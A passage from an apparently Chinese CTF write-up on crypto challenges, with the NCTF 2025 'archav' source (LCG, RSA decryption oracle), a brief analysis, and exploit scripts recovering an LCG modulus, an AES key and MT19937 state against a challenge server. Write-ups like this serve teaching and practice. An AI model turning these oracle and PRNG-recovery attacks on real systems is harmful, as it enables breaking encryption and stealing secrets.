class="hljs-number">1</span>))<br>    B = matrix(xs[<span class="hljs-number">1</span>:])<br>    C = matrix.diagonal([-xs[<span class="hljs-number">0</span>]] * (le - <span class="hljs-number">1</span>))<br>    M = matrix.block([[A, B], [ZZ(<span class="hljs-number">0</span>), C]])<br>    M = M.LLL()<br>    q0 = ZZ(M[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] / A).<span class="hljs-built_in">abs</span>()<br>    e0 = ZZ(xs[<span class="hljs-number">0</span>] % q0)<br>    p = ZZ((xs[<span class="hljs-number">0</span>] - e0) / q0)<br><br>    gift=[<span class="hljs-built_in">int</span>(j%p%<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> Keys[i:i+<span class="hljs-number">2500</span>]]<br>    gift=[(gift[j]&lt;&lt;<span class="hljs-number">24</span>)+(gift[j+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(gift[j+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)+gift[j+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(gift),<span class="hljs-number">4</span>)]<br>    gift=gift[::-<span class="hljs-number">1</span>]<br>    known = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> gift[<span class="hljs-number">1</span>:]:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>):<br>            known+=k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] solve_left &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>    s = L.solve_left(vector(GF(<span class="hljs-number">2</span>),known))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok!&quot;</span>)<br>    init = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,s)))<br>    state = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        state.append(<span class="hljs-built_in">int</span>(init[<span class="hljs-number">32</span>*j:<span class="hljs-number">32</span>*j+<span class="hljs-number">32</span>],<span class="hljs-number">2</span>))<br>        <br><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        prng.getrandbits(<span class="hljs-number">32</span>)<br><br>    s=long_to_bytes(prng.getrandbits(<span class="hljs-number">32</span>))<br>    m=[j%p%<span class="hljs-number">256</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> Keys[i+<span class="hljs-number">2500</span>-<span class="hljs-number">4</span>:i+<span class="hljs-number">2500</span>]]<br>    m=[(m[j]*inverse_mod(s[j],<span class="hljs-number">0x101</span>))%<span class="hljs-number">0x101</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    x=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> m[::-<span class="hljs-number">1</span>]:<br>        x=(x&lt;&lt;<span class="hljs-number">2</span>)+j<br>    <span class="hljs-built_in">print</span>(x)<br>    stri+=<span class="hljs-built_in">bytes</span>([x])<br><br><span class="hljs-built_in">print</span>(AES.new(md5(stri).digest(),AES.MODE_ECB).decrypt(ciphertext))<br></code></pre></td></tr></table></figure><h2 id="archav"><a class="markdownIt-Anchor" href="#archav"></a> archav</h2><h3 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom,getenv<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.p = getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.a = getPrime(<span class="hljs-number">1023</span>)<br>        <span class="hljs-variable language_">self</span>.b = getPrime(<span class="hljs-number">1023</span>)<br>        <span class="hljs-variable language_">self</span>.status = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        ret = <span class="hljs-variable language_">self</span>.status<br>        <span class="hljs-variable language_">self</span>.status = (<span class="hljs-variable language_">self</span>.status * <span class="hljs-variable language_">self</span>.a + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.p<br>        <span class="hljs-keyword">return</span> ret<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crystal_trick</span>(<span class="hljs-params">m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    m = <span class="hljs-built_in">bytearray</span>(m)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>        m[i] = reduce(<span class="hljs-keyword">lambda</span> x,y: x^y^urandom(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>],m[:i],m[i])<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSA</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        p = getStrongPrime(<span class="hljs-number">1024</span>)<br>        q = getStrongPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.p = p<br>        <span class="hljs-variable language_">self</span>.N = p * q<br>        <span class="hljs-variable language_">self</span>.e = <span class="hljs-number">65537</span><br>        <span class="hljs-variable language_">self</span>.d = <span class="hljs-built_in">pow</span>(<span class="hljs-variable language_">self</span>.e, -<span class="hljs-number">1</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m,<span class="hljs-variable language_">self</span>.e,<span class="hljs-variable language_">self</span>.N)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(c,<span class="hljs-variable language_">self</span>.d,<span class="hljs-variable language_">self</span>.N) <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRSA1</span>(<span class="hljs-title class_ inherited__">RSA</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().encrypt(<span class="hljs-built_in">int</span>.from_bytes(m)).to_bytes(<span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().decrypt(<span class="hljs-built_in">int</span>.from_bytes(c)).to_bytes(<span class="hljs-number">256</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRSA2</span>(<span class="hljs-title class_ inherited__">RSA</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>.from_bytes(m),<span class="hljs-variable language_">self</span>.e,<span class="hljs-variable language_">self</span>.N).to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        m = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>.from_bytes(c),<span class="hljs-variable language_">self</span>.d,<span class="hljs-variable language_">self</span>.N).to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hibiscus is here to trick your decryption result!!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> crystal_trick(m)<br><br>menu = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Welcome to NCTF 2025 arcahv challenge!</span><br><span class="hljs-string"></span><br><span class="hljs-string">--- Menu ---</span><br><span class="hljs-string">[1] View encrypted flag and hint</span><br><span class="hljs-string">[2] Play with the decryption orcale</span><br><span class="hljs-string">[3] Get some random numbers for fun</span><br><span class="hljs-string">[4] Exit</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your Option &gt; &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Loading, please wait...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># flag = open(&#x27;flag.txt&#x27;).read().strip().encode()</span><br>    flag = getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>).encode()<br>    attempts = <span class="hljs-number">75</span><br>    r1 = MyRSA1()<br>    r2 = MyRSA2()<br>    hint1 = r2.encrypt(r1.p.to_bytes(<span class="hljs-number">128</span>))<br><br>    key = urandom(<span class="hljs-number">16</span>)<br>    hint2 = AES.new(key,AES.MODE_ECB).encrypt(r1.N.to_bytes(<span class="hljs-number">256</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_and_hint</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Encrypted flag: <span class="hljs-subst">&#123;r1.encrypt(flag).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Hint1: <span class="hljs-subst">&#123;hint1.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Hint2: <span class="hljs-subst">&#123;hint2.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rsachal</span>(): <br>        <span class="hljs-keyword">global</span> attempts<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Since you didn&#x27;t v Hibiscus 50 on crazy thursday, Hibiscus decided to do some trick on your decryption result!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Your pubkey:(<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r2.N)[<span class="hljs-number">2</span>:]&#125;</span>,<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r2.e)[<span class="hljs-number">2</span>:]&#125;</span>)&#x27;</span>)<br><br>        <span class="hljs-keyword">while</span> attempts &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Do you still want to try decryption(y/[n])?&#x27;</span>) != <span class="hljs-string">&#x27;y&#x27;</span>:<br>                <span class="hljs-keyword">break</span><br><br>            c = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;You have <span class="hljs-subst">&#123;attempts&#125;</span> remaining access to decryption orcale!\nYour ciphertext(in hex):&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Result: <span class="hljs-subst">&#123;r2.decrypt(c).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>            attempts -= <span class="hljs-number">1</span><br>        <br>        <span class="hljs-keyword">if</span> attempts == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Unfortunately, you are out of decryption attempts! Come back again on nctf2026 ~&#x27;</span>)<br><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lcgchal</span>():<br>        lcg = LCG(<span class="hljs-built_in">int</span>.from_bytes(key))<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Tempering with LCG generator, please wait...&#x27;</span>)<br>        <span class="hljs-keyword">while</span> urandom(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span>:<br>            lcg.<span class="hljs-built_in">next</span>()<br>        <br>        hexnums = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">hex</span>(lcg.<span class="hljs-built_in">next</span>())[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(hexnums) % <span class="hljs-number">16</span>:<br>            hexnums = hexnums.zfill((<span class="hljs-built_in">len</span>(hexnums) // <span class="hljs-number">16</span> + <span class="hljs-number">1</span>) * <span class="hljs-number">16</span>)<br>        <br>        idx = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Do you want another unsigned long long number(y/[n])?&#x27;</span>) == <span class="hljs-string">&#x27;y&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(hexnums[idx:idx+<span class="hljs-number">16</span>]),<span class="hljs-number">16</span>))<br>            idx = (idx + <span class="hljs-number">16</span>) % <span class="hljs-built_in">len</span>(hexnums)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hope you have fun during the challenge XD:)&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    fundc = &#123;<span class="hljs-number">1</span>:flag_and_hint,<span class="hljs-number">2</span>:rsachal,<span class="hljs-number">3</span>:lcgchal,<span class="hljs-number">4</span>:bye&#125;<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        opt = <span class="hljs-built_in">input</span>(menu)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(opt) == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> opt <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;1234&#x27;</span>:<br>            opt = <span class="hljs-string">&#x27;4&#x27;</span><br>        fundc[<span class="hljs-built_in">int</span>(opt)]()<br></code></pre></td></tr></table></figure><h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3><p>第一层LCG，没啥难点，就是只给5个数据需要点运气才能利用GCD求出来模数，中间出错基本就是这里问题，多试几次就好了。</p><p>第二层RSA bytes orcale，ctf-wiki上讲的很详细了<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle">RSA 选择明密文攻击 - CTF Wiki</a>。</p><p>之后显然只有75轮是不够的，最多也是只能得到75*8=600位的p，最后打一个高位攻击就好了。主要就是可以先自己运行127轮，将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn><msup><mn>6</mn><mn>127</mn></msup><mi>p</mi></mrow><annotation encoding="application/x-tex">256^{127}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span>构造到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">r_2.N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>这个数量级上（应该是可以直接设置上限了，我懒得思考了），然后再跟服务器交互。</p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh=remote(<span class="hljs-string">&quot;39.106.16.204&quot;</span>,<span class="hljs-number">13620</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;flag: &#x27;</span>)<br>ciphertext=bytes_to_long(<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode()))<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hint1: &#x27;</span>)<br>Hint1=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hint2: &#x27;</span>)<br>Hint2=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br><br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><br>s=[]<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1280</span>,<span class="hljs-number">16</span>):<br>    sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>    s.append(<span class="hljs-built_in">int</span>(sh.recvline().strip().decode()))<br>    <br>s=[<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s[i:i+<span class="hljs-number">16</span>]]),<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">80</span>,<span class="hljs-number">16</span>)]<br><br>length=<span class="hljs-built_in">len</span>(s)<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>    t.append(s[i]-s[i-<span class="hljs-number">1</span>])<br>all_n = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length-<span class="hljs-number">3</span>):<br>    all_n.append(gcd((t[i+<span class="hljs-number">1</span>]*t[i-<span class="hljs-number">1</span>]-t[i]*t[i]), (t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]*t[i+<span class="hljs-number">1</span>])))<br><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> all_n:<br>    n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">abs</span>(n))<br>    <span class="hljs-keyword">if</span> n.bit_length()&lt;<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(n):<br>        <span class="hljs-keyword">continue</span><br>    a=(s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*invert((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]),n)%n<br>    ani=invert(a,n)<br>    b=(s[<span class="hljs-number">1</span>]-a*s[<span class="hljs-number">0</span>])%n<br><br>    <span class="hljs-comment">#这里可能找不到正确的LCG的p</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find p&quot;</span>)<br><br>    seed=s[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        seed=<span class="hljs-built_in">int</span>((seed-b)*inverse(a,n) % n)<br>        <span class="hljs-keyword">if</span> seed.bit_length()&lt;=<span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">break</span><br>    seed=long_to_bytes(seed)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(seed)<br>    <br>    <span class="hljs-comment">#这里不对还是因为上面p找不对</span><br>    r1n=bytes_to_long(AES.new(seed,AES.MODE_ECB).decrypt(Hint2))<br>    <br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;Your pubkey:(&#x27;</span>)<br>    r2n=<span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>).strip().decode()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    r2e=<span class="hljs-built_in">int</span>(sh.recvline().strip().decode()[:-<span 